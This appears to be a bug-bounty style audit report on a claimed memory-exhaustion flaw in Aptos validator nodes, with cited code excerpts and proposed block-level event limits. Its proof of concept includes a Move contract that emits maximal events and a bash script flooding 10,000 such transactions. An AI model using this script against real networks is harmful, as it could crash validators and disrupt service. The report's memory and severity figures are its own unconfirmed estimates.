# Audit Report

## Title
Heap Exhaustion During Block Commit via Unbounded Total Event Output Size

## Summary
The `encode_value()` function in the event storage schema can cause heap exhaustion and OOM kills during block commitment. While individual events are limited to 1MB and per-transaction events to 10MB, there is no limit on the total event output across all transactions in a block. When committing blocks with many transactions producing maximal events, the BCS encoding process temporarily doubles memory usage, potentially exhausting heap memory on validator nodes.

## Finding Description

The vulnerability exists in the event encoding and commit flow: [1](#0-0) 

This `encode_value()` function performs BCS serialization of `ContractEvent` objects, which contain an `event_data` field that can be up to 1MB: [2](#0-1) 

Event size limits are enforced per-transaction during execution: [3](#0-2) [4](#0-3) 

However, blocks can contain up to 10,000 transactions: [5](#0-4) 

The block size limit only applies to INPUT transaction bytes, not OUTPUT events: [6](#0-5) [7](#0-6) 

During block commitment, events are encoded in parallel chunks: [8](#0-7) 

The encoding process allocates new memory via BCS serialization, which creates a new `Vec<u8>` for each event. The encoded bytes are then stored in RocksDB WriteBatches: [9](#0-8) [10](#0-9) 

**Attack Path:**
1. Attacker creates transactions that emit 10MB of events each (at the per-transaction limit)
2. These transactions have minimal transaction byte size (~100-600 bytes each)
3. Attacker floods mempool with such transactions
4. Consensus includes up to 10,000 transactions in a block (within 6MB transaction byte limit)
5. Block executes successfully, producing 100GB of total event output
6. During `pre_commit_ledger`, the `commit_events` function processes all events
7. Events are split into 4 parallel chunks for encoding
8. Each chunk's events are BCS-encoded, creating new allocations
9. Memory consumption: 100GB (original events in TransactionOutputs) + 100GB (encoded events in batches) = 200GB peak
10. Validators with <256GB RAM experience OOM and crash/slowdown

## Impact Explanation

This is a **High Severity** vulnerability per the Aptos bug bounty criteria:

- **Validator node slowdowns**: Validators experiencing memory pressure will slow down during block commitment
- **API crashes**: Validators that OOM will crash and become unavailable
- **Protocol violations**: Affects node availability and could cause temporary consensus issues if multiple validators crash simultaneously

The impact is significant because:
- Memory exhaustion is deterministic for blocks with maximal event output
- Affects all validators processing the block
- Can be triggered repeatedly by an attacker
- No recovery mechanism beyond node restart
- Does not require validator privileges

This does NOT qualify as Critical because:
- It does not cause consensus safety violations (different state roots)
- Network can recover once affected nodes restart
- Does not require a hardfork
- Not permanent network partition

## Likelihood Explanation

This vulnerability has **Medium to High** likelihood of exploitation:

**Factors increasing likelihood:**
- Easy to execute: Attacker only needs to submit transactions
- No special privileges required
- Event limits are per-transaction, making it trivial to create many transactions with maximal events
- Block size limit (6MB) only applies to transaction bytes, not event output
- Many validators may run with 128-256GB RAM where 200GB peak would cause OOM

**Factors decreasing likelihood:**
- Requires gas payment for all transactions (economic cost)
- Some validators may have >256GB RAM and survive
- Transaction throughput limits may prevent all 10,000 transactions from being included quickly

## Recommendation

Implement a **per-block total event size limit** in addition to the existing per-transaction limit. This should be enforced during block proposal/validation before execution:

1. **Add block-level event size limit:**
```rust
// In aptos-move/aptos-gas-schedule/src/gas_schedule/transaction.rs
[
    max_bytes_all_events_per_block: NumBytes,
    { 5.. => "max_bytes_all_events_per_block" },
    100 << 20, // 100MB max per block
]
```

2. **Enforce during block validation:**
```rust
// In consensus/src/round_manager.rs, add check in process_proposal:
let estimated_total_events = payload_len * average_events_per_txn;
ensure!(
    estimated_total_events <= max_bytes_all_events_per_block,
    "Estimated total event output {} exceeds block limit {}",
    estimated_total_events,
    max_bytes_all_events_per_block
);
```

3. **Validate after execution:**
```rust
// In aptos-move/aptos-vm-types/src/storage/change_set_configs.rs
pub fn check_block_change_set(&self, all_change_sets: &[impl ChangeSetInterface]) -> Result<(), VMStatus> {
    let mut total_event_size = 0u64;
    for change_set in all_change_sets {
        for event in change_set.events_iter() {
            total_event_size += event.event_data().len() as u64;
        }
    }
    if total_event_size > self.max_bytes_all_events_per_block {
        return storage_write_limit_reached(Some("Total events exceed block limit"));
    }
    Ok(())
}
```

4. **Alternative: Stream encoding instead of batching** to reduce peak memory:
```rust
// In aptosdb_writer.rs, encode and write events incrementally
// instead of building full batches in memory
```

## Proof of Concept

**Move Contract (event_bomber.move):**
```move
module attacker::event_bomber {
    use std::vector;
    use aptos_framework::event;

    struct LargeEvent has drop, store {
        data: vector<u8>
    }

    public entry fun emit_large_events(sender: &signer) {
        let data = vector::empty<u8>();
        let i = 0;
        // Create ~1MB of data
        while (i < 1048576) {
            vector::push_back(&mut data, 0xFF);
            i = i + 1;
        };
        
        // Emit 10 events of ~1MB each = 10MB total
        let j = 0;
        while (j < 10) {
            event::emit(LargeEvent { data: copy data });
            j = j + 1;
        };
    }
}
```

**Attack Script:**
```bash
#!/bin/bash
# Submit 10,000 transactions calling emit_large_events
for i in {1..10000}; do
    aptos move run \
        --function-id attacker::event_bomber::emit_large_events \
        --assume-yes &
    
    # Throttle to avoid mempool limits
    if [ $((i % 100)) -eq 0 ]; then
        sleep 1
    fi
done
wait

# Monitor validator memory usage
watch -n 1 'ps aux | grep aptos-node | grep -v grep | awk "{print \$6}"'
```

**Expected Result:**
- Block with many such transactions will cause validator memory to spike from ~X GB to ~(X+200) GB during commit
- Validators with insufficient RAM will OOM and crash
- Other validators will experience severe slowdowns during commit phase

## Notes

The vulnerability stems from the architectural design where:
1. Event size limits are enforced at the transaction level (correct for deterministic execution)
2. Block size limits only apply to input transaction bytes (correct for network efficiency)
3. No aggregate event size limit exists at the block level (design oversight)
4. Commit phase has no memory tracking (outside VM execution context)

This creates a gap where an attacker can construct blocks with acceptable input size but massive output size, exploiting the temporary memory doubling during BCS encoding.

### Citations

**File:** storage/aptosdb/src/schema/event/mod.rs (L50-52)
```rust
    fn encode_value(&self) -> Result<Vec<u8>> {
        bcs::to_bytes(self).map_err(Into::into)
    }
```

**File:** types/src/contract_event.rs (L188-190)
```rust
    #[serde(with = "serde_bytes")]
    event_data: Vec<u8>,
}
```

**File:** aptos-move/aptos-vm-types/src/storage/change_set_configs.rs (L115-125)
```rust
        let mut total_event_size = 0;
        for event in change_set.events_iter() {
            let size = event.event_data().len() as u64;
            if size > self.max_bytes_per_event {
                return storage_write_limit_reached(None);
            }
            total_event_size += size;
            if total_event_size > self.max_bytes_all_events_per_transaction {
                return storage_write_limit_reached(None);
            }
        }
```

**File:** aptos-move/aptos-gas-schedule/src/gas_schedule/transaction.rs (L164-172)
```rust
            max_bytes_per_event: NumBytes,
            { 5.. => "max_bytes_per_event" },
            1 << 20, // a single event is 1MB max
        ],
        [
            max_bytes_all_events_per_transaction: NumBytes,
            { 5.. => "max_bytes_all_events_per_transaction"},
            10 << 20, // all events from a single transaction are 10MB max
        ],
```

**File:** config/src/config/consensus_config.rs (L23-24)
```rust
pub(crate) static MAX_RECEIVING_BLOCK_TXNS: Lazy<u64> =
    Lazy::new(|| 10000.max(2 * MAX_SENDING_BLOCK_TXNS));
```

**File:** config/src/config/consensus_config.rs (L231-231)
```rust
            max_receiving_block_bytes: 6 * 1024 * 1024, // 6MB
```

**File:** consensus/src/round_manager.rs (L1187-1193)
```rust
        ensure!(
            validator_txns_total_bytes + payload_size as u64
                <= self.local_config.max_receiving_block_bytes,
            "Payload size {} exceeds the limit {}",
            payload_size,
            self.local_config.max_receiving_block_bytes,
        );
```

**File:** storage/aptosdb/src/db/aptosdb_writer.rs (L386-420)
```rust
    fn commit_events(
        &self,
        first_version: Version,
        transaction_outputs: &[TransactionOutput],
        skip_index: bool,
    ) -> Result<()> {
        let _timer = OTHER_TIMERS_SECONDS.timer_with(&["commit_events"]);

        let chunk_size = transaction_outputs.len() / 4 + 1;
        let batches = transaction_outputs
            .par_chunks(chunk_size)
            .enumerate()
            .map(|(chunk_idx, chunk)| {
                let mut batch = self.ledger_db.event_db().db().new_native_batch();
                let chunk_first_ver = first_version + (chunk_size * chunk_idx) as u64;
                chunk.iter().enumerate().try_for_each(|(i, txn_out)| {
                    self.ledger_db.event_db().put_events(
                        chunk_first_ver + i as Version,
                        txn_out.events(),
                        skip_index,
                        &mut batch,
                    )
                })?;
                Ok(batch)
            })
            .collect::<Result<Vec<_>>>()?;

        {
            let _timer = OTHER_TIMERS_SECONDS.timer_with(&["commit_events___commit"]);
            for batch in batches {
                self.ledger_db.event_db().db().write_schemas(batch)?
            }
            Ok(())
        }
    }
```

**File:** storage/schemadb/src/batch.rs (L99-106)
```rust
    fn put<S: Schema>(&mut self, key: &S::Key, value: &S::Value) -> DbResult<()> {
        let key = <S::Key as KeyCodec<S>>::encode_key(key)?;
        let value = <S::Value as ValueCodec<S>>::encode_value(value)?;

        self.stats()
            .put(S::COLUMN_FAMILY_NAME, key.len() + value.len());
        self.raw_put(S::COLUMN_FAMILY_NAME, key, value)
    }
```

**File:** storage/schemadb/src/batch.rs (L228-233)
```rust
    fn raw_put(&mut self, cf_name: ColumnFamilyName, key: Vec<u8>, value: Vec<u8>) -> DbResult<()> {
        self.raw_batch
            .inner
            .put_cf(&self.db.get_cf_handle(cf_name)?, &key, &value);

        Ok(())
```
